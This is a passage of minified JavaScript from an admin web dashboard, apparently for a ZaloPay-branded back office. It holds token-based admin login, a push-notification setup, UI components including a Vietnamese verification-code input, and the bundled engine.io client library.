it({type:"ADD_TOAST",toast:{...n,id:t,open:!0,onOpenChange:r=>{r||a()}}}),{id:t,dismiss:a,update:s}}function Se(){const[n,t]=d.useState(ft);return d.useEffect(()=>(gt.push(t),()=>{const s=gt.indexOf(t);s>-1&&gt.splice(s,1)}),[n]),{...n,toast:je,dismiss:s=>it({type:"DISMISS_TOAST",toastId:s})}}function dr(){const{toasts:n}=Se();return e.jsxs(nr,{children:[n.map(function({id:t,title:s,description:a,action:r,...i}){return e.jsxs(jn,{...i,children:[e.jsxs("div",{className:"grid gap-1",children:[s&&e.jsx(vn,{children:s}),a&&e.jsx(bn,{children:a})]}),r,e.jsx(yn,{})]},t)}),e.jsx(fn,{})]})}const Pt="/api",Dt="zalopay_admin_token",xt="zalopay_admin_user";class Q{static async login(t,s){const a=await fetch(`${Pt}/admin/auth/login`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:t,password:s})});if(!a.ok){const i=await a.json();throw new Error(i.error||"Login failed")}const r=await a.json();return localStorage.setItem(Dt,r.token),localStorage.setItem(xt,JSON.stringify(r.user)),r}static logout(){localStorage.removeItem(Dt),localStorage.removeItem(xt)}static getToken(){return localStorage.getItem(Dt)}static getUser(){const t=localStorage.getItem(xt);return t?JSON.parse(t):null}static isAuthenticated(){const t=this.getToken(),s=this.getUser();return!!(t&&s)}static async getCurrentUser(){const t=this.getToken();if(!t)throw new Error("No authentication token");const s=await fetch(`${Pt}/admin/auth/me`,{headers:{Authorization:`Bearer ${t}`}});if(!s.ok)throw s.status===401?(this.logout(),new Error("Session expired")):new Error("Failed to get user info");const a=await s.json();return localStorage.setItem(xt,JSON.stringify(a)),a}static async apiRequest(t,s={}){const a=this.getToken();if(!a)throw new Error("No authentication token");const r=await fetch(`${Pt}${t}`,{...s,headers:{"Content-Type":"application/json",Authorization:`Bearer ${a}`,...s.headers}});if(!r.ok){if(r.status===401)throw this.logout(),window.location.href="/login",new Error("Session expired");const c=await r.json().catch(()=>({error:"Request failed"}));throw new Error(c.error||c.message||`HTTP ${r.status}`)}const i=r.headers.get("content-type");if(i&&i.includes("application/json")){const c=await r.json();return c.success&&c.data&&Array.isArray(c.data)&&c.pagination?{items:c.data,total:c.pagination.total,pages:c.pagination.totalPages,current_page:c.pagination.page,per_page:c.pagination.limit}:c.success&&c.data?c.data:c}return r.text()}static async refreshToken(){try{await this.getCurrentUser()}catch(t){throw this.logout(),t}}static setupTokenRefresh(){setInterval(()=>{this.isAuthenticated()&&this.refreshToken().catch(()=>{})},30*60*1e3)}}typeof window<"u"&&Q.setupTokenRefresh();function hr(n){const t="=".repeat((4-n.length%4)%4),s=(n+t).replace(/-/g,"+").replace(/_/g,"/"),a=atob(s),r=new Uint8Array(a.length);for(let i=0;i<a.length;++i)r[i]=a.charCodeAt(i);return r}async function Es(){try{if(!("serviceWorker"in navigator)||!("PushManager"in window)||!Q.isAuthenticated()||(Notification.permission==="default"&&await Notification.requestPermission(),Notification.permission!=="granted"))return;const n=await navigator.serviceWorker.register("/admin/sw.js");await navigator.serviceWorker.ready;const t=await fetch("/api/admin/push/public-key"),{publicKey:s}=await t.json();if(!s)return;const a=await n.pushManager.subscribe({userVisibleOnly:!0,applicationServerKey:hr(s)});await Q.apiRequest("/admin/push/subscribe",{method:"POST",body:JSON.stringify({subscription:a})})}catch(n){console.warn("Push registration failed",n)}}const se=d.forwardRef(({className:n,type:t,...s},a)=>e.jsx("input",{type:t,className:Z("flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50",n),ref:a,...s}));se.displayName="Input";const mr=es("inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50",{variants:{variant:{default:"bg-primary text-primary-foreground hover:bg-primary/90",destructive:"bg-destructive text-destructive-foreground hover:bg-destructive/90",outline:"border border-input bg-background hover:bg-accent hover:text-accent-foreground",secondary:"bg-secondary text-secondary-foreground hover:bg-secondary/80",ghost:"hover:bg-accent hover:text-accent-foreground",link:"text-primary underline-offset-4 hover:underline"},size:{default:"h-10 px-4 py-2",sm:"h-9 rounded-md px-3",lg:"h-11 rounded-md px-8",icon:"h-10 w-10"}},defaultVariants:{variant:"default",size:"default"}}),C=d.forwardRef(({className:n,variant:t,size:s,asChild:a=!1,...r},i)=>{const c=a?Un:"button";return e.jsx(c,{className:Z(mr({variant:t,size:s,className:n})),ref:i,...r})});C.displayName="Button";function Ht({value:n,onChange:t,length:s=6,disabled:a=!1,placeholder:r="Nhập mã xác thực",error:i,onComplete:c}){const[x,l]=d.useState(!1),y=d.useRef(null);d.useEffect(()=>{n.length===s&&c&&c(n)},[n,s,c]);const f=o=>{let p=o.target.value;s===6?(p=p.replace(/\D/g,""),p.length>s&&(p=p.slice(0,s))):(p=p.replace(/[^a-zA-Z0-9]/g,""),p.length>s&&(p=p.slice(0,s))),t(p)},b=o=>{["Backspace","Delete","ArrowLeft","ArrowRight","Tab"].includes(o.key)||s===6&&!/[0-9]/.test(o.key)&&!o.ctrlKey&&!o.metaKey&&o.preventDefault()};return e.jsxs("div",{className:"space-y-2",children:[e.jsxs("div",{className:"relative",children:[e.jsx(se,{ref:y,type:x?"text":"password",value:n,onChange:f,onKeyDown:b,disabled:a,placeholder:r,maxLength:s,className:`text-center text-lg font-mono tracking-widest ${i?"border-red-500":""}`,style:{letterSpacing:"0.5em"}}),e.jsx(C,{type:"button",variant:"ghost",size:"icon",className:"absolute right-2 top-1/2 transform -translate-y-1/2",onClick:()=>l(!x),disabled:a,children:x?e.jsx(cn,{className:"h-4 w-4"}):e.jsx($e,{className:"h-4 w-4"})})]}),i&&e.jsx("p",{className:"text-sm text-red-600",children:i}),s===6&&e.jsx("p",{className:"text-xs text-gray-500",children:"Nhập mã 6 chữ số từ ứng dụng xác thực của bạn"})]})}const k=d.forwardRef(({className:n,...t},s)=>e.jsx("div",{ref:s,className:Z("rounded-lg border bg-card text-card-foreground shadow-sm",n),...t}));k.displayName="Card";const L=d.forwardRef(({className:n,...t},s)=>e.jsx("div",{ref:s,className:Z("flex flex-col space-y-1.5 p-6",n),...t}));L.displayName="CardHeader";const M=d.forwardRef(({className:n,...t},s)=>e.jsx("h3",{ref:s,className:Z("text-2xl font-semibold leading-none tracking-tight",n),...t}));M.displayName="CardTitle";const ve=d.forwardRef(({className:n,...t},s)=>e.jsx("p",{ref:s,className:Z("text-sm text-muted-foreground",n),...t}));ve.displayName="CardDescription";const _=d.forwardRef(({className:n,...t},s)=>e.jsx("div",{ref:s,className:Z("p-6 pt-0",n),...t}));_.displayName="CardContent";const xr=d.forwardRef(({className:n,...t},s)=>e.jsx("div",{ref:s,className:Z("flex items-center p-6 pt-0",n),...t}));xr.displayName="CardFooter";const ur=es("inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2",{variants:{variant:{default:"border-transparent bg-primary text-primary-foreground hover:bg-primary/80",secondary:"border-transparent bg-secondary text-secondary-foreground hover:bg-secondary/80",destructive:"border-transparent bg-destructive text-destructive-foreground hover:bg-destructive/80",outline:"text-foreground",success:"border-transparent bg-green-100 text-green-800 hover:bg-green-100/80",warning:"border-transparent bg-yellow-100 text-yellow-800 hover:bg-yellow-100/80",info:"border-transparent bg-blue-100 text-blue-800 hover:bg-blue-100/80"}},defaultVariants:{variant:"default"}});function $({className:n,variant:t,...s}){return e.jsx("div",{className:Z(ur({variant:t}),n),...s})}const Re=Object.create(null);Re.open="0";Re.close="1";Re.ping="2";Re.pong="3";Re.message="4";Re.upgrade="5";Re.noop="6";const jt=Object.create(null);Object.keys(Re).forEach(n=>{jt[Re[n]]=n});const Kt={type:"error",data:"parser error"},Nn=typeof Blob=="function"||typeof Blob<"u"&&Object.prototype.toString.call(Blob)==="[object BlobConstructor]",wn=typeof ArrayBuffer=="function",kn=n=>typeof ArrayBuffer.isView=="function"?ArrayBuffer.isView(n):n&&n.buffer instanceof ArrayBuffer,ls=({type:n,data:t},s,a)=>Nn&&t instanceof Blob?s?a(t):Rs(t,a):wn&&(t instanceof ArrayBuffer||kn(t))?s?a(t):Rs(new Blob([t]),a):a(Re[n]+(t||"")),Rs=(n,t)=>{const s=new FileReader;return s.onload=function(){const a=s.result.split(",")[1];t("b"+(a||""))},s.readAsDataURL(n)};function Os(n){return n instanceof Uint8Array?n:n instanceof ArrayBuffer?new Uint8Array(n):new Uint8Array(n.buffer,n.byteOffset,n.byteLength)}let qt;function pr(n,t){if(Nn&&n.data instanceof Blob)return n.data.arrayBuffer().then(Os).then(t);if(wn&&(n.data instanceof ArrayBuffer||kn(n.data)))return t(Os(n.data));ls(n,!1,s=>{qt||(qt=new TextEncoder),t(qt.encode(s))})}const Ls="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",rt=typeof Uint8Array>"u"?[]:new Uint8Array(256);for(let n=0;n<Ls.length;n++)rt[Ls.charCodeAt(n)]=n;const gr=n=>{let t=n.length*.75,s=n.length,a,r=0,i,c,x,l;n[n.length-1]==="="&&(t--,n[n.length-2]==="="&&t--);const y=new ArrayBuffer(t),f=new Uint8Array(y);for(a=0;a<s;a+=4)i=rt[n.charCodeAt(a)],c=rt[n.charCodeAt(a+1)],x=rt[n.charCodeAt(a+2)],l=rt[n.charCodeAt(a+3)],f[r++]=i<<2|c>>4,f[r++]=(c&15)<<4|x>>2,f[r++]=(x&3)<<6|l&63;return y},fr=typeof ArrayBuffer=="function",os=(n,t)=>{if(typeof n!="string")return{type:"message",data:_n(n,t)};const s=n.charAt(0);return s==="b"?{type:"message",data:jr(n.substring(1),t)}:jt[s]?n.length>1?{type:jt[s],data:n.substring(1)}:{type:jt[s]}:Kt},jr=(n,t)=>{if(fr){const s=gr(n);return _n(s,t)}else return{base64:!0,data:n}},_n=(n,t)=>{switch(t){case"blob":return n instanceof Blob?n:new Blob([n]);case"arraybuffer":default:return n instanceof ArrayBuffer?n:n.buffer}},Sn="",yr=(n,t)=>{const s=n.length,a=new Array(s);let r=0;n.forEach((i,c)=>{ls(i,!1,x=>{a[c]=x,++r===s&&t(a.join(Sn))})})},vr=(n,t)=>{const s=n.split(Sn),a=[];for(let r=0;r<s.length;r++){const i=os(s[r],t);if(a.push(i),i.type==="error")break}return a};function br(){return new TransformStream({transform(n,t){pr(n,s=>{const a=s.length;let r;if(a<126)r=new Uint8Array(1),new DataView(r.buffer).setUint8(0,a);else if(a<65536){r=new Uint8Array(3);const i=new DataView(r.buffer);i.setUint8(0,126),i.setUint16(1,a)}else{r=new Uint8Array(9);const i=new DataView(r.buffer);i.setUint8(0,127),i.setBigUint64(1,BigInt(a))}n.data&&typeof n.data!="string"&&(r[0]|=128),t.enqueue(r),t.enqueue(s)})}})}let It;function ut(n){return n.reduce((t,s)=>t+s.length,0)}function pt(n,t){if(n[0].length===t)return n.shift();const s=new Uint8Array(t);let a=0;for(let r=0;r<t;r++)s[r]=n[0][a++],a===n[0].length&&(n.shift(),a=0);return n.length&&a<n[0].length&&(n[0]=n[0].slice(a)),s}function Nr(n,t){It||(It=new TextDecoder);const s=[];let a=0,r=-1,i=!1;return new TransformStream({transform(c,x){for(s.push(c);;){if(a===0){if(ut(s)<1)break;const l=pt(s,1);i=(l[0]&128)===128,r=l[0]&127,r<126?a=3:r===126?a=1:a=2}else if(a===1){if(ut(s)<2)break;const l=pt(s,2);r=new DataView(l.buffer,l.byteOffset,l.length).getUint16(0),a=3}else if(a===2){if(ut(s)<8)break;const l=pt(s,8),y=new DataView(l.buffer,l.byteOffset,l.length),f=y.getUint32(0);if(f>Math.pow(2,21)-1){x.enqueue(Kt);break}r=f*Math.pow(2,32)+y.getUint32(4),a=3}else{if(ut(s)<r)break;const l=pt(s,r);x.enqueue(os(i?l:It.decode(l),t)),a=0}if(r===0||r>n){x.enqueue(Kt);break}}}})}const Cn=4;function de(n){if(n)return wr(n)}function wr(n){for(var t in de.prototype)n[t]=de.prototype[t];return n}de.prototype.on=de.prototype.addEventListener=function(n,t){return this._callbacks=this._callbacks||{},(this._callbacks["$"+n]=this._callbacks["$"+n]||[]).push(t),this};de.prototype.once=function(n,t){function s(){this.off(n,s),t.apply(this,arguments)}return s.fn=t,this.on(n,s),this};de.prototype.off=de.prototype.removeListener=de.prototype.removeAllListeners=de.prototype.removeEventListener=function(n,t){if(this._callbacks=this._callbacks||{},arguments.length==0)return this._callbacks={},this;var s=this._callbacks["$"+n];if(!s)return this;if(arguments.length==1)return delete this._callbacks["$"+n],this;for(var a,r=0;r<s.length;r++)if(a=s[r],a===t||a.fn===t){s.splice(r,1);break}return s.length===0&&delete this._callbacks["$"+n],this};de.prototype.emit=function(n){this._callbacks=this._callbacks||{};for(var t=new Array(arguments.length-1),s=this._callbacks["$"+n],a=1;a<arguments.length;a++)t[a-1]=arguments[a];if(s){s=s.slice(0);for(var a=0,r=s.length;a<r;++a)s[a].apply(this,t)}return this};de.prototype.emitReserved=de.prototype.emit;de.prototype.listeners=function(n){return this._callbacks=this._callbacks||{},this._callbacks["$"+n]||[]};de.prototype.hasListeners=function(n){return!!this.listeners(n).length};const Tt=typeof Promise=="function"&&typeof Promise.resolve=="function"?t=>Promise.resolve().then(t):(t,s)=>s(t,0),be=typeof self<"u"?self:typeof window<"u"?window:Function("return this")(),kr="arraybuffer";function Tn(n,...t){return t.reduce((s,a)=>(n.hasOwnProperty(a)&&(s[a]=n[a]),s),{})}const _r=be.setTimeout,Sr=be.clearTimeout;function At(n,t){t.useNativeTimers?(n.setTimeoutFn=_r.bind(be),n.clearTimeoutFn=Sr.bind(be)):(n.setTimeoutFn=be.setTimeout.bind(be),n.clearTimeoutFn=be.clearTimeout.bind(be))}const Cr=1.33;function Tr(n){return typeof n=="string"?Ar(n):Math.ceil((n.byteLength||n.size)*Cr)}function Ar(n){let t=0,s=0;for(let a=0,r=n.length;a<r;a++)t=n.charCodeAt(a),t<128?s+=1:t<2048?s+=2:t<55296||t>=57344?s+=3:(a++,s+=4);return s}function An(){return Date.now().toString(36).substring(3)+Math.random().toString(36).substring(2,5)}function Er(n){let t="";for(let s in n)n.hasOwnProperty(s)&&(t.length&&(t+="&"),t+=encodeURIComponent(s)+"="+encodeURIComponent(n[s]));return t}function Rr(n){let t={},s=n.split("&");for(let a=0,r=s.length;a<r;a++){let i=s[a].split("=");t[decodeURIComponent(i[0])]=decodeURIComponent(i[1])}return t}class Or extends Error{constructor(t,s,a){super(t),this.description=s,this.context=a,this.type="TransportError"}}class ds extends de{constructor(t){super(),this.writable=!1,At(this,t),this.opts=t,this.query=t.query,this.socket=t.socket,this.supportsBinary=!t.forceBase64}onError(t,s,a){return super.emitReserved("error",new Or(t,s,a)),this}open(){return this.readyState="opening",this.doOpen(),this}close(){return(this.readyState==="opening"||this.readyState==="open")&&(this.doClose(),this.onClose()),this}send(t){this.readyState==="open"&&this.write(t)}onOpen(){this.readyState="open",this.writable=!0,super.emitReserved("open")}onData(t){const s=os(t,this.socket.binaryType);this.onPacket(s)}onPacket(t){super.emitReserved("packet",t)}onClose(t){this.readyState="closed",super.emitReserved("close",t)}pause(t){}createUri(t,s={}){return t+"://"+this._hostname()+this._port()+this.opts.path+this._query(s)}_hostname(){const t=this.opts.hostname;return t.indexOf(":")===-1?t:"["+t+"]"}_port(){return this.opts.port&&(this.opts.secure&&+(this.opts.port!==443)||!this.opts.secure&&Number(this.opts.port)!==80)?":"+this.opts.port:""}_query(t){const s=Er(t);return s.length?"?"+s:""}}class Lr extends ds{constructor(){super(...arguments),this._polling=!1}get name(){return"polling"}doOpen(){this._poll()}pause(t){this.readyState="pausing";const s=()=>{this.readyState="paused",t()};if(this._polling||!this.writable){let a=0;this._polling&&(a++,this.once("pollComplete",function(){--a||s()})),this.writable||(a++,this.once("drain",function(){--a||s()}))}else s()}_poll(){this._polling=!0,this.doPoll(),this.emitReserved("poll")}onData(t){const s=a=>{if(this.readyState==="opening"&&a.type==="open"&&this.onOpen(),a.type==="close")return this.onClose({description:"transport closed by the server"}),!1;this.onPacket(a)};vr(t,this.socket.binaryType).forEach(s),this.readyState!=="closed"&&(this._polling=!1,this.emitReserved("pollComplete"),this.readyState==="open"&&this._poll())}doClose(){const t=()=>{this.write([{type:"close"}])};this.readyState==="open"?t():this.once("open",t)}write(t){this.writable=!1,yr(t,s=>{this.doWrite(s,()=>{this.writable=!0,this.emitReserved("drain")})})}uri(){const t=this.opts.secure?"https":"http",s=this.query||{};return this.opts.timestampRequests!==!1&&(s[this.opts.timestampParam]=An()),!this.supportsBinary&&!s.sid&&(s.b64=1),this.createUri(t,s)}}let En=!1;try{En=typeof XMLHttpRequest<"u"&&"withCredentials"in new XMLHttpRequest}catch{}const Mr=En;function Pr(){}class Dr extends Lr{constructor(t){if(super(t),typeof location<"u"){const s=location.protocol==="https:";let a=location.port;a||(a=s?"443":"80"),this.xd=typeof location<"u"&&t.hostname!==location.hostname||a!==t.port}}doWrite(t,s){const a=this.request({method:"POST",data:t});a.on("success",s),a.on("error",(r,i)=>{this.onError("xhr post error",r,i)})}doPoll(){const t=this.request();t.on("data",this.onData.bind(this)),t.on("error",(s,a)=>{this.onError("xhr poll error",s,a)}),this.pollXhr=t}}class Ae extends de{constructor(t,s,a){super(),this.createRequest=t,At(this,a),this._opts=a,this._method=a.method||"GET",this._uri=s,this._data=a.data!==void 0?a.data:null,this._create()}_create(){var t;const s=Tn(this._opts,"agent","pfx","key","passphrase","cert","ca","ciphers","rejectUnauthorized","autoUnref");s.xdomain=!!this._opts.xd;const a=this._xhr=this.createRequest(s);try{a.open(this._method,this._uri,!0);try{if(this._opts.extraHeaders){a.setDisableHeaderCheck&&a.setDisableHeaderCheck(!0);for(let r in this._opts.extraHeaders)this._opts.extraHeaders.hasOwnProperty(r)&&a.setRequestHeader(r,this._opts.extraHeaders[r])}}catch{}if(this._method==="POST")try{a.setRequestHeader("Content-type","text/plain;charset=UTF-8")}catch{}try{a.setRequestHeader("Accept","*/*")}catch{}(t=this._opts.cookieJar)===null||t===void 0||t.addCookies(a),"withCredentials"in a&&(a.withCredentials=this._opts.withCredentials),this._opts.requestTimeout&&(a.timeout=this._opts.requestTimeout),a.onreadystatechange=()=>{var r;a.readyState===3&&((r=this._opts.cookieJar)===null||r===void 0||r.parseCookies(a.getResponseHeader("set-cookie"))),a.readyState===4&&(a.status===200||a.status===1223?this._onLoad():this.setTimeoutFn(()=>{this._onError(typeof a.status=="number"?a.status:0)},0))},a.send(this._data)}catch(r){this.setTimeoutFn(()=>{this._onError(r)},0);return}typeof document<"u"&&(this._index=Ae.requestsCount++,Ae.requests[this._index]=this)}_onError(t){this.emitReserved("error",t,this._xhr),this._cleanup(!0)}_cleanup(t){if(!(typeof this._xhr>"u"||this._xhr===null)){if(this._xhr.onreadystatechange=Pr,t)try{this._xhr.abort()}catch{}typeof document<"u"&&delete Ae.requests[this._index],this._xhr=null}}_onLoad(){const t=this._xhr.responseText;t!==null&&(this.emitReserved("data",t),this.emitReserved("success"),this._cleanup())}abort(){this._cleanup()}}Ae.requestsCount=0;Ae.requests={};if(typeof document<"u"){if(typeof attachEvent=="function")attachEvent("onunload",Ms);else if(typeof addEventListener=="function"){const n="onpagehide"in be?"pagehide":"unload";addEventListener(n,Ms,!1)}}function Ms(){for(let n in Ae.requests)Ae.requests.hasOwnProperty(n)&&Ae.requests[n].abort()}const qr=function(){const n=Rn({xdomain:!1});return n&&n.responseType!==null}();class Ir extends Dr{constructor(t){super(t);const s=t&&t.forceBase64;this.supportsBinary=qr&&!s}request(t={}){return Object.assign(t,{xd:this.xd},this.opts),new Ae(Rn,this.uri(),t)}}function Rn(n){const t=n.xdomain;try{if(typeof XMLHttpRequest<"u"&&(!t||Mr))return new XMLHttpRequest}catch{}if(!t)try{return new be[["Active"].concat("Object").join("X")]("Microsoft.XMLHTTP")}catch{}}const On=typeof navigator<"u"&&typeof navigator.product=="string"&&navigator.product.toLowerCase()==="reactnative";class Br extends ds{get name(){return"websocket"}doOpen(){const t=this.uri(),s=this.opts.protocols,a=On?{}:Tn(this.opts,"agent","perMessageDeflate","pfx","key","passphrase","cert","ca","ciphers","rejectUnauthorized","localAddress","protocolVersion","origin","maxPayload","family","checkServerIdentity");this.opts.extraHeaders&&(a.headers=this.opts.extraHeaders);try{this.ws=this.createSocket(t,s,a)}catch(r){return this.emitReserved("error",r)}this.ws.binaryType=this.socket.binaryType,this.addEventListeners()}addEventListeners(){this.ws.onopen=()=>{this.opts.autoUnref&&this.ws._socket.unref(),this.onOpen()},this.ws.onclose=t=>this.onClose({description:"websocket connection closed",context:t}),this.ws.onmessage=t=>this.onData(t.data),this.ws.onerror=t=>this.onError("websocket error",t)}write(t){this.writable=!1;for(let s=0;s<t.length;s++){const a=t[s],r=s===t.length-1;ls(a,this.supportsBinary,i=>{try{this.doWrite(a,i)}catch{}r&&Tt(()=>{this.writable=!0,this.emitReserved("drain")},this.setTimeoutFn)})}}doClose(){typeof this.ws<"u"&&(this.ws.onerror=()=>{},this.ws.close(),this.ws=null)}uri(){const t=this.opts.secure?"wss":"ws",s=this.query||{};return this.opts.timestampRequests&&(s[this.opts.timestampParam]=An()),this.supportsBinary||(s.b64=1),this.createUri(t,s)}}const Bt=be.WebSocket||be.MozWebSocket;class Fr extends Br{createSocket(t,s,a){return On?new Bt(t,s,a):s?new Bt(t,s):new Bt(t)}doWrite(t,s){this.ws.send(s)}}class Vr extends ds{get name(){return"webtransport"}doOpen(){try{this._transport=new WebTransport(this.createUri("https"),this.opts.transportOptions[this.name])}catch(t){return this.emitReserved("error",t)}this._transport.closed.then(()=>{this.onClose()}).catch(t=>{this.onError("webtransport error",t)}),this._transport.ready.then(()=>{this._transport.createBidirectionalStream().then(t=>{const s=Nr(Number.MAX_SAFE_INTEGER,this.socket.binaryType),a=t.readable.pipeThrough(s).getReader(),r=br();r.readable.pipeTo(t.writable),this._writer=r.writable.getWriter();const i=()=>{a.read().then(({done:x,value:l})=>{x||(this.onPacket(l),i())}).catch(x=>{})};i();const c={type:"open"};this.query.sid&&(c.data=`{"sid":"${this.query.sid}"}`),this._writer.write(c).then(()=>this.onOpen())})})}write(t){this.writable=!1;for(let s=0;s<t.length;s++){const a=t[s],r=s===t.length-1;this._writer.write(a).then(()=>{r&&Tt(()=>{this.writable=!0,this.emitReserved("drain")},this.setTimeoutFn)})}}doClose(){var t;(t=this._transport)===null||t===void 0||t.close()}}const zr={websocket:Fr,webtransport:Vr,polling:Ir},Ur=/^(?:(?![^:@\/?#]+:[^:@\/]*@)(http|https|ws|wss):\/\/)?((?:(([^:@\/?#]*)(?::([^:@\/?#]*))?)?@)?((?:[a-f0-9]{0,4}:){2,7}[a-f0-9]{0,4}|[^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/,$r=["source","protocol","authority","userInfo","user","password","host","port","relative","path","directory","file","query","anchor"];function Gt(n){if(n.length>8e3)throw"URI too long";const t=n,s=n.indexOf("["),a=n.indexOf("]");s!=-1&&a!=-1&&(n=n.substring(0,s)+n.substring(s,a).replace(/:/g,";")+n.substring(a,n.length));let r=Ur.exec(n||""),i={},c=14;for(;c--;)i[$r[c]]=r[c]||"";return s!=-1&&a!=-1&&(i.source=t,i.host=i.host.substring(1,i.host.length-1).replace(/;/g,":"),i.authority=i.authority.replace("[","").replace("]","").replace(/;/g,":"),i.ipv6uri=!0),i.pathNames=Hr(i,i.path),i.queryKey=Kr(i,i.query),i}function Hr(n,t){const s=/\/{2,9}/g,a=t.replace(s,"/").split("/");return(t.slice(0,1)=="/"||t.length===0)&&a.splice(0,1),t.slice(-1)=="/"&&a.splice(a.length-1,1),a}function Kr(n,t){const s={};return t.replace(/(?:^|&)([^&=]*)=?([^&]*)/g,function(a,r,i){r&&(s[r]=i)}),s}const Qt=typeof addEventListener=="function"&&typeof removeEventListener=="function",yt=[];Qt&&addEventListener("offline",()=>{yt.forEach(n=>n())},!1);class ze extends de{constructor(t,s){if(super(),this.binaryType=kr,this.writeBuffer=[],this._prevBufferLen=0,this._pingInterval=-1,this._pingTimeout=-1,this._maxPayload=-1,this._pingTimeoutTime=1/0,t&&typeof t=="object"&&(s=t,t=null),t){const a=Gt(t);s.hostname=a.host,s.secure=a.protocol==="https"||a.protocol==="wss",s.port=a.port,a.query&&(s.query=a.query)}else s.host&&(s.hostname=Gt(s.host).host);At(this,s),this.secure=s.secure!=null?s.secure:typeof location<"u"&&location.protocol==="https:",s.hostname&&!s.port&&(s.port=this.secure?"443":"80"),this.hostname=s.hostname||(typeof location<"u"?location.hostname:"localhost"),this.port=s.port||(typeof location<"u"&&location.port?location.port:this.secure?"443":"80"),this.transports=[],this._transportsByName={},s.transports.forEach(a=>{const r=a.prototype.name;this.transports.push(r),this._transportsByName[r]=a}),this.opts=Object.assign({path:"/engine.io",agent:!1,withCredentials:!1,upgrade:!0,timestampParam:"t",rememberUpgrade:!1,addTrailingSlash:!0,rejectUnauthorized:!0,perMessageDeflate:{threshold:1024},transportOptions:{},closeOnBeforeunload:!1},s),this.opts.path=this.opts.path.replace(/\/$/,"")+(this.opts.addTrailingSlash?"/":""),typeof this.opts.query=="string"&&(this.opts.query=Rr(this.opts.query)),Qt&&(this.opts.closeOnBeforeunload&&(this._beforeunloadEventListener=()=>{this.transport&&(this.transport.removeAllListeners(),this.transport.close())},addEventListener("beforeunload",this._beforeunloadEventListener,!1)),this.hostname!=="localhost"&&(this._offlineEventListener=()=>{this._onClose("transport close",{description:"network connection lost"})},yt.push(this._offlineEventListener))),this.opts.withCredentials&&(this._cookieJar=void 0),this._open()}createTransport(t){const s=Object.assign({},this.opts.query);s.EIO=Cn,s.transport=t,this.id&&(s.sid=this.id);const a=Object.assign({},this.opts,{query:s,socket:this,hostname:this.hostname,secure:this.secure,port:this.port},this.opts.transportOptions[t]);return new this._transportsByName[t](a)}_open(){if(this.transports.length===0){this.setTimeoutFn(()=>{this.emitReserved("error","No transports available")},0);return}const t=this.opts.rememberUpgrade&&ze.priorWebsocketSuccess&&this.transports.indexOf("websocket")!==-1?"websocket":this.transports[0];this.readyState="opening";const s=this.createTransport(t);s.open(),this.setTransport(s)}setTransport(t){this.transport&&this.transport.removeAllListeners(),this.transport=t,t.on("drain",this._onDrain.bind(this)).on("packet",this._onPacket.bind(this)).on("error",this._onError.bind(this)).on("close",s=>this._onClose("transport close",s))}onOpen(){this.readyState="open",ze.priorWebsocketSuccess=this.transport.name==="websocket",this.emitReserved("open"),this.flush()}_onPacket(t){if(this.readyState==="opening"||this.readyState==="open"||this.readyState==="closing")switch(this.emitReserved("packet",t),this.emitReserved("heartbeat"),t.type){case"open":this.onHandshake(JSON.parse(t.data));break;case"ping":this._sendPacket("pong"),this.emitReserved("ping"),this.emitReserved("pong"),this._resetPingTimeout();break;case"error":const s=new Error("server error");s.code=t.data,this._onError(s);break;case"message":this.emitReserved("data",t.data),this.emitReserved("message",t.data);break}}onHandshake(t){this.emitReserved("handshake",t),this.id=t.sid,this.transport.query.sid=t.sid,this._pingInterval=t.pingInterval,this._pingTimeout=t.pingTimeout,this._maxPayload=t.maxPayload,this.onOpen(),this.readyState!=="closed"&&this._resetPingTimeout()}_resetPingTimeout(){this.clearTimeoutFn(this._pingTimeoutTimer);const t=this._pingInterval+this._pingTimeout;this._pingTimeoutTime=Date.now()+t,this._pingTimeoutTimer=this.setTimeoutFn(()=>{this._onClose("ping timeout")},t),this.opts.autoUnref&&this._pingTimeoutTimer.unref()}_onDrain(){this.writeBuffer.splice(0,this._prevBufferLen),this._prevBufferLen=0,this.writeBuffer.length===0?this.emitReserved("drain"):this.flush()}flush(){if(this.readyState!=="closed"&&this.transport.writable&&!this.upgrading&&this.writeBuffer.length){const t=this._getWritablePackets();this.transport.send(t),this._prevBufferLen=t.length,this.emitReserved("flush")}}_getWritablePackets(){if(!(this._maxPayload&&this.transport.name==="polling"&&this.writeBuffer.length>1))return this.writeBuffer;let s=1;for(let a=0;a<this.writeBuffer.length;a++){const r=this.writeBuffer[a].data;if(r&&(s+=Tr(r)),a>0&&s>this._maxPayload)return this.writeBuffer.slice(0,a);s+=2}return this.writeBuffer}_hasPingExpired(){if(!this._pingTimeoutTime)return!0;const t=Date.now()>this._pingTimeoutTime;return t&&(this._pingTimeoutTime=0,Tt(()=>{this._onClose("ping timeout")},this.setTimeoutFn)),t}write(t,s,a){return this._sendPacket("message",t,s,a),this}send(t,s,a){return this._sendPacket("message",t,s,a),this}_sendPacket(t,s,a,r){if(typeof s=="function"&&(r=s,s=void 0),typeof a=="function"&&(r=a,a=null),this.readyState==="closing"||this.readyState==="closed")return;a=a||{},a.compress=a.compress!==!1;const i={type:t,data:s,options:a};this.emitReserved("packetCreate",i),this.writeBuffer.push(i),r&&this.once("flush",r),this.flush()}close(){const t=()=>{this._onClose("forced close"),this.transport.close()},s=()=>{this.off("upgrade",s),this.off("upgradeError",s),t()},a=()=>{this.once("upgrade",s),this.once("upgradeError",s)};return(this.readyState==="opening"||this.readyState==="open")&&(this.readyState="closing",this.writeBuffer.length?this.once("drain",()=>{this.upgrading?a():t()}):this.upgrading?a():t()),this}_onError(t){if(ze.priorWebsocketSuccess=!1,this.opts.tryAllTransports&&this.transports.length>1&&this.readyState==="opening")return 